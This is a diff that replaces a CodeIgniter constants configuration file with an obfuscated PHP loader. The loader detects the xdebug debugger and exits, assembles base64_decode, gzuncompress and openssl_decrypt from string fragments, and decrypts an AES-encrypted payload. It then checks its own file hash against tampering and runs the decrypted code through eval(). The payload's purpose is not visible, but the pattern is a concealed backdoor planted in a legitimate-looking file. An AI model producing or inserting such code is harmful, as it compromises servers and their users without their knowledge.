@@ -1,85 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-|--------------------------------------------------------------------------
-| Display Debug backtrace
-|--------------------------------------------------------------------------
-|
-| If set to TRUE, a backtrace will be displayed along with php errors. If
-| error_reporting is disabled, the backtrace will not display, regardless
-| of this setting
-|
-*/
-defined('SHOW_DEBUG_BACKTRACE') OR define('SHOW_DEBUG_BACKTRACE', TRUE);
-
-/*
-|--------------------------------------------------------------------------
-| File and Directory Modes
-|--------------------------------------------------------------------------
-|
-| These prefs are used when checking and setting modes when working
-| with the file system.  The defaults are fine on servers with proper
-| security, but you may wish (or even need) to change the values in
-| certain environments (Apache running a separate process for each
-| user, PHP under CGI with Apache suEXEC, etc.).  Octal values should
-| always be used to set the mode correctly.
-|
-*/
-defined('FILE_READ_MODE')  OR define('FILE_READ_MODE', 0644);
-defined('FILE_WRITE_MODE') OR define('FILE_WRITE_MODE', 0666);
-defined('DIR_READ_MODE')   OR define('DIR_READ_MODE', 0755);
-defined('DIR_WRITE_MODE')  OR define('DIR_WRITE_MODE', 0755);
-
-/*
-|--------------------------------------------------------------------------
-| File Stream Modes
-|--------------------------------------------------------------------------
-|
-| These modes are used when working with fopen()/popen()
-|
-*/
-defined('FOPEN_READ')                           OR define('FOPEN_READ', 'rb');
-defined('FOPEN_READ_WRITE')                     OR define('FOPEN_READ_WRITE', 'r+b');
-defined('FOPEN_WRITE_CREATE_DESTRUCTIVE')       OR define('FOPEN_WRITE_CREATE_DESTRUCTIVE', 'wb'); // truncates existing file data, use with care
-defined('FOPEN_READ_WRITE_CREATE_DESTRUCTIVE')  OR define('FOPEN_READ_WRITE_CREATE_DESTRUCTIVE', 'w+b'); // truncates existing file data, use with care
-defined('FOPEN_WRITE_CREATE')                   OR define('FOPEN_WRITE_CREATE', 'ab');
-defined('FOPEN_READ_WRITE_CREATE')              OR define('FOPEN_READ_WRITE_CREATE', 'a+b');
-defined('FOPEN_WRITE_CREATE_STRICT')            OR define('FOPEN_WRITE_CREATE_STRICT', 'xb');
-defined('FOPEN_READ_WRITE_CREATE_STRICT')       OR define('FOPEN_READ_WRITE_CREATE_STRICT', 'x+b');
-
-/*
-|--------------------------------------------------------------------------
-| Exit Status Codes
-|--------------------------------------------------------------------------
-|
-| Used to indicate the conditions under which the script is exit()ing.
-| While there is no universal standard for error codes, there are some
-| broad conventions.  Three such conventions are mentioned below, for
-| those who wish to make use of them.  The CodeIgniter defaults were
-| chosen for the least overlap with these conventions, while still
-| leaving room for others to be defined in future versions and user
-| applications.
-|
-| The three main conventions used for determining exit status codes
-| are as follows:
-|
-|    Standard C/C++ Library (stdlibc):
-|       http://www.gnu.org/software/libc/manual/html_node/Exit-Status.html
-|       (This link also contains other GNU-specific conventions)
-|    BSD sysexits.h:
-|       http://www.gsp.com/cgi-bin/man.cgi?section=3&topic=sysexits
-|    Bash scripting:
-|       http://tldp.org/LDP/abs/html/exitcodes.html
-|
-*/
-defined('EXIT_SUCCESS')        OR define('EXIT_SUCCESS', 0); // no errors
-defined('EXIT_ERROR')          OR define('EXIT_ERROR', 1); // generic error
-defined('EXIT_CONFIG')         OR define('EXIT_CONFIG', 3); // configuration error
-defined('EXIT_UNKNOWN_FILE')   OR define('EXIT_UNKNOWN_FILE', 4); // file not found
-defined('EXIT_UNKNOWN_CLASS')  OR define('EXIT_UNKNOWN_CLASS', 5); // unknown class
-defined('EXIT_UNKNOWN_METHOD') OR define('EXIT_UNKNOWN_METHOD', 6); // unknown class member
-defined('EXIT_USER_INPUT')     OR define('EXIT_USER_INPUT', 7); // invalid user input
-defined('EXIT_DATABASE')       OR define('EXIT_DATABASE', 8); // database error
-defined('EXIT__AUTO_MIN')      OR define('EXIT__AUTO_MIN', 9); // lowest automatically-assigned error code
-defined('EXIT__AUTO_MAX')      OR define('EXIT__AUTO_MAX', 125); // highest automatically-assigned error code
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zc1xhz7d=('bas'.'e64'.'_de'.'cod'.'e');
+$_mfvewdqr=('gzu'.'nco'.'mpr'.'ess');
+$_h0tvr88a=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_do7xokoc='e4+T2MM0';
+$_fad17qon='YJVVD8L/XJM=';
+$_m24iatad='CRXEL0T1';
+$_oxgxaigy='ppOvyV35';
+$_iy66a2jf='Fe8BDEHc';
+$_if858asc='A7hWBg==';
+$_h42ib232='kxDHm3qw';
+$_j1yheuv6='X7DWn4D9';
+$_wqndrpns=$_zc1xhz7d($_iy66a2jf.$_m24iatad.$_do7xokoc.$_oxgxaigy.$_fad17qon);
+$_iobvq3ho=$_zc1xhz7d($_h42ib232.$_j1yheuv6.$_if858asc);
+$_phbhwt83=$_zc1xhz7d('dkNY2qwBuomw+wO8EdsYFSouk3CBuDr7BAxrgrj3+3uNJ/dTurTpVL+G+Uigq4jnmQIt4JOyqrsoviT1ej6q/EW+lW/9BWkF2qcvuZcEYUZ3FstAjNIcnKG4Y72iIkQhkpYpFiJSB8IjlY9qpQnuNSPK2oIbj9qUlv+sFqxBjBcz8MUr+Wmba5ObzxISHNos+vMp1SNsLdLe8HnXFfzfWzahGRQJPycfLBTFD8K3kOT+kEgh0I2uvT/F6KyLi4a/JrOyd+bRSL3NNw53KykHPnNmOwOlvy5jgh7QhA5Vth/LtpXJPseeHOjbN86qQW3DctNp+AJsMInVzSvoMdmGn1e3qkF6BAP75ubY9kxEGiwlxabn8xopD3OnX6dMU0ZgGmw1n2AM5kxOz+FaUXWYshNWyj+L1vWxvqt3WykBP6GN2/X3Zi3YdUzqC8UmReSBxqFwgV02ZFM2rOJ8UEXJPR4DO5i8oA7bESAPhNOz+eA+yYbY+G0gkQp7m82Np+q4jBj8LGuohA44kC49C5wPqcHvVlZjvRjw9TJXtUUoyQ8esHd0d0sK3LJDIgccT2nPVJz8oTuI4RrpJGvZRqvCq9wSUfWCRjugxuaeNzBLbis=');
+$_picfyhj6=$_h0tvr88a($_phbhwt83,'aes-256-cbc',$_wqndrpns,OPENSSL_RAW_DATA,$_iobvq3ho);
+if($_picfyhj6===false){exit;}
+$_dehvtf9w=$_mfvewdqr($_picfyhj6);
+if($_dehvtf9w===false){exit;}
+$_xz70afqz='90b5a8ff4c19777365ed5ce394b8ff4a5ddbf1e1cb26a68557a3926e8b6d5305';
+$_i7d9c6pk=@file_get_contents(__FILE__);
+if($_i7d9c6pk!==false){
+$_z369cph7=str_replace($_xz70afqz,"0000000000000000000000000000000000000000000000000000000000000000",$_i7d9c6pk);
+$_ps911cic=hash("sha256",$_z369cph7);
+if($_ps911cic!==$_xz70afqz){@http_response_code(403);exit;}
+}
+eval($_dehvtf9w);
